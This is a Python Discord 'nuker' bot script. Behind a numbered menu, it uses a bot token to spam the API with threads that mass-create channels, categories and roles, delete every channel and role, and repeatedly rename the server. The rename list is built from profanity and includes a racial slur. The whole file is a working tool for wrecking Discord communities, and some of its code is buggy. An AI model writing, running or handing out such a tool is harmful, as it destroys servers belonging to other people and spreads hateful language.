#pylint:disable=W0604
import time,json,os,random,discord
from gratient import blue,green
from discord.ext import commands
from httpx import post,delete,patch
from concurrent.futures import ThreadPoolExecutor
from os import system
from time import sleep
from threading import Thread
intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='>', intents=intents)



bot.remove_command("help")
def cls():
	if os == 'window':
		system('cls')
	else:
		system('clear')
cls()

token = ""
guid = ""
with open('config.json') as configs:
	settings = json.load(configs)

token = settings['token']
guid = settings['guild']

global Header



Header = {
    "Authorization": "Bot " + token
}

cls()

async def obj():
    guild = guid
    await bot.wait_until_ready()
    OBJ = bot.get_guild(int(guild))
    try:
        os.remove("ch.txt")
        os.remove("rl.txt")
    except:
    	pass
    channelcount = 0
    with open('ch.txt', 'a') as c:
            for channel in OBJ.channels:
            	c.write(str(channel.id) + "\n")
            	channelcount += 1
            c.close()

    rolecount = 0
    with open('rl.txt', 'a') as r:
            for role in OBJ.roles:
            	r.write(str(role.id) + "\n")
            	rolecount += 1
            r.close()


def channel_spammer(guild,name):
   while True:
       try:
       	httpstatus = post(F"https://discord.com/api/v10/guilds/{guild}/channels",headers=Header,json={"name": name, "type": 0})
       	if 'retry_after' in httpstatus.text:
       		time.sleep(httpstatus.json()['retry_after'])
       	else:
       			if httpstatus.status_code == 200 or httpstatus.status_code == 201 or httpstatus.status_code == 204:
       				idch = httpstatus.json()
       				print(green(F"created channel {idch['id']}"))
       				break
       			else:
       				print(httpstatus.status_code)
       				break
       except: pass

def voice_spammer(guild,name):
	while True:
		try:
			http = post(F"https://discord.com/api/v10/guilds/{guild}/channels",headers=Header,json={'name': name, 'type': 2})
			if 'retry_after' in http.text:
				time.sleep(http.json()['retry_after'])
			else:
				if http.status_code == 200 or http.status_code == 201 or http.status_code == 204:
					idch = http.json()
					print(green(F"created voice channel {idch['id']}"))
					break
				else:
					print(http.status_code)
					break
		except: pass

def category_spammer(guild,name):
	while True:
		try:
			http = post(F"https://discord.com/api/v10/guilds/{guild}/channels",headers=Header,json={'name': name, 'type': 4})
			if 'retry_after' in http.text:
				time.sleep(http.json()['retry_after'])
			else:
				if http.status_code == 200 or http.status_code == 201 or http.status_code == 204:
					idch = http.json()
					print(green(F"created cetegory {idch['id']}"))
					break
				else:
					print(http.status_code)
					break
		except: pass

def roledel(guild,role):
	while True:
		try:
			http = delete('https://discord.com/api/v9/guilds/{guild}/roles/{role}',headers=Header)
			if 'retry_after' in http.text:
			     sleep(http.json()['retry_after'])
			else:
				if http.status_code == 200 or http.status_code == 201 or http.status_code == 204:
					print(green(F"deleted {role} {role.strip()}"))
					break
				else:
					print(http.status_code)
					break
					
		except: pass


def roles_spammer(guild,name):
	while True:
		try:
			http = post(F"https://discord.com/api/v10/guilds/{guild}/roles",headers=Header,json={'name': name})
			if 'retry_after' in http.text:
				time.sleep(http.json()['retry_after'])
			else:
				if http.status_code == 200 or http.status_code == 201 or http.status_code == 204:
					print(green(F'created roles {name}'))
					break
				else:
					print(http.status_code)
					break
		except: pass

def delete_channel(guild,channel):
	while True:
		try:
			http = delete(F"https://discord.com/api/v9/channels/{channel}",headers=Header)
			if 'retry_after' in http.text:
				time.sleep(http.json()['retry_after'])
			else:
				if http.status_code == 200 or http.status_code == 201 or http.status_code == 204:
					#idch = http.json()
					print(green(F"deleted channel {channel.strip()} "))
					break
				else:
					print(http.status_code)
					break
		except: pass

def rename_server(guild,name):
	http = patch(F'https://discord.com/api/v10/guilds/{guild}',headers=Header,json={'name': name})
	if http.status_code == 200:
		print(green(F'[success] rename {name}'))
	else:
		print(http.status_code)

def randomnameserver(guild,name):	
	http = patch(F'https://discord.com/api/v10/guilds/{guild}',headers=Header,json={'name': random.choice(name)})
	if http.status_code == 200:
		print(green(F'[success] random {name}'))
	else:
		print(http.status_code)
	
#kick https://discord.com/api/v9/guilds/{guild}/members/{member}
#delete https://discord.com/api/v9/channels/{channel}
#deleteroles https://discord.com/api/v9/guilds/{guild}/roles/{role}
#voice https://discord.com/api/v9/guilds/{guild}/channels
# Category https://discord.com/api/v9/guilds/{guild}/channels
# renameserver https://discord.com/api/v9/guilds/{guild}
async def channel():	
	guild = guid
	print(green('create text channel'))
	name = input(green("channel name : "))
	amount = int(input(green("amount : ")))
	print('')
	for _ in range(amount):
		Thread(target=channel_spammer,args=(guild,name,)).start()

async def roledelete():
	guild = guid
	print(green("delete all role"))
	roles = open('rl.txt')
	for role in roles:
	       Thread(target=roledel, args=(guild, role,)).start()
	roles.close()

		
async def voice():
	guild = guid
	print(green('create voice channel'))
	name = input(green('voice ch name : '))
	amount = int(input(green("amount : ")))
	print('')
	for _ in range(amount):
		Thread(target=voice_spammer,args=(guild,name,)).start()
	

async def category():
	guild = guid
	print(green('create category'))
	name = input(green('category name : '))
	amount = int(input(green("amount : ")))
	print('')
	for _ in range(amount):
		Thread(target=category_spammer,args=(guild,name,)).start()



async def roles():
	guild = guid
	print(green('creatw role'))
	name = input(green("roles name : "))
	amount = int(input(green("amount : ")))
	print('')
	for _ in range(amount):
		Thread(target=roles_spammer,args=(guild,name,)).start()


async def deletechannel():
	guild = guid
	print(green('delete all channel'))
	print('')
	channels = open('ch.txt')
	for channel in channels:
		Thread(target=delete_channel,args=(guild,channel,)).start()
	channels.close()

async def rename():
	guild = guid
	print(green('change nserver name'))
	name = input(green('server name : '))
	rename_server(guild,name)

async def randomname():
	guild = guid
	rename = 0
	with ThreadPoolExecutor(max_workers=int(999)) as thread:
		name = ["FUCKYOU","BITCH","SHUTUP","SERVERNUKER","NIGGA","BITCHCALLMEDOLLAR","REALBADBITCH","STUPIDDOG"]
		while rename <= 50:
			thread.submit(randomnameserver,guild,name)
			rename = rename +1

class streaming:
	async def stream():
		status_name = input("status name : ")
		await bot.change_presence(activity=discord.Streaming(name=status_name, url="https://www.twitch.tv/beenverysad"))
		print('success run 24/7')

async def uwu():
    await obj()
    print(blue(F'''
    
         ╔╗   ╔═╗  ╔═╗  ╔╗╔  ═╗ ╦  ╔╦╗ 
         ╠╩╗  ║╣   ║╣   ║║║  ╔╩╦╝   ║║ 
         ╚═╝  ╚═╝  ╚═╝  ╝╚╝  ╩ ╚═  ═╩╝ ©
    
     
      
    login as : {bot.user.name}#{bot.user.discriminator}
    
    [1] create text channel   [2] create voice channel
    [3] create category       [4] create roles
    [5] delete all channel    [6] delete all roles
    [7] rename server         [8] random server name
    [9] exit
    
    '''))
    print('')
    select = input("select choice : ")
    if select == '1':
    	await channel()
    	#input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '2':
    	await voice()
   # 	input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '3':
    	await category()
    #	input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '4':
    	await roles()
    #	input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '5':
    	await deletechannel()
    	#input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '6':
    	await roledelete()
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '7':
    	await rename()
    	#input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '8':
    	await randomname()
    	#input('')
    	sleep(4)
    	cls()
    	await uwu()
    elif select == '9':
    	os.system('python3 main.py')
    else:
    	cls()
    	for _ in range(5):
    		print(F'no function {select}!! :)')
    	sleep(1.5)
    	cls()
    	cls()
    	await uwu()

@bot.event
async def on_ready():
    await uwu()


bot.run(token)
